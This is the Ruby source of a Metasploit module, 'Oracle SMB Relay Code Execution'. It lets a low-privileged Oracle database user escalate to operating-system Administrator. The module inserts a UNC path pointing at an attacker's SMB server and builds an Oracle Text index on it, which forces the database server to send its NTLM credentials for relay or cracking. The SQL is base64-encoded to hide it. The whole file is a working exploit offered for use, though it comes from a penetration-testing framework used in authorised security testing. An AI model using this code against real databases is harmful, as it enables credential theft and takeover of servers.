##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Auxiliary
  include Msf::Exploit::ORACLE

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Oracle SMB Relay Code Execution',
        'Description' => %q{
          This module will help you to get Administrator access to OS using an unprivileged
          Oracle database user (you need only CONNECT and RESOURCE privileges).
          To do this you must firstly run smb_sniffer or smb_relay module on your server.
          Then you must connect to Oracle database and run this module Ora_NTLM_stealer.rb
          which will connect to your SMB server with credentials of Oracle RDBMS.
          So if smb_relay is working, you will get Administrator access to server which
          runs Oracle. If not than you can decrypt HALFLM hash.
        },
        'Author' => [ 'Sh2kerr <research[ad]dsecrg.com>' ],
        'License' => MSF_LICENSE,
        'References' => [
          [ 'URL', 'http://dsecrg.com/pages/pub/show.php?id=17' ],
        ],
        'DisclosureDate' => '2009-04-07',
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )

    register_options(
      [
        OptString.new('IP', [ false, 'IP address of SMB proxy.', '0.0.0.0' ]),
      ]
    )
  end

  def run
    return if !check_dependencies

    name1 = Rex::Text.rand_text_alpha_upper(1..10)
    name2 = Rex::Text.rand_text_alpha_upper(1..10)
    rand1 = Rex::Text.rand_text_alpha_upper(1..10)
    rand2 = Rex::Text.rand_text_alpha_upper(1..10)
    rand3 = Rex::Text.rand_text_alpha_upper(1..10)

    prepare = "CREATE TABLE #{name1} (id NUMBER PRIMARY KEY,path VARCHAR(255) UNIQUE,col_format VARCHAR(6))"
    prepare1 = "INSERT INTO #{name1} VALUES (1, '\\\\#{datastore['IP']}\\SHARE', NULL)"

    exploiting1 = "CREATE INDEX #{name2} ON #{name1}(path) INDEXTYPE IS ctxsys.context PARAMETERS ('datastore ctxsys.file_datastore format column col_format')"

    prp = Rex::Text.encode_base64(prepare)
    prp1 = Rex::Text.encode_base64(prepare1)
    exp1 = Rex::Text.encode_base64(exploiting1)

    sql = %|
      DECLARE
      #{rand1} VARCHAR2(32767);
      #{rand2} VARCHAR2(32767);
      #{rand3} VARCHAR2(32767);
      BEGIN
      #{rand1} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp}')));
      EXECUTE IMMEDIATE #{rand1};
      #{rand2} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{prp1}')));
      EXECUTE IMMEDIATE #{rand2};
      #{rand3} := utl_raw.cast_to_varchar2(utl_encode.base64_decode(utl_raw.cast_to_raw('#{exp1}')));
      EXECUTE IMMEDIATE #{rand3};
      END;
      |

    begin
      print_status("Executing #{name}...")
      prepare_exec(sql)
    rescue StandardError => e
      vprint_error(e.message)
    end
  end
end
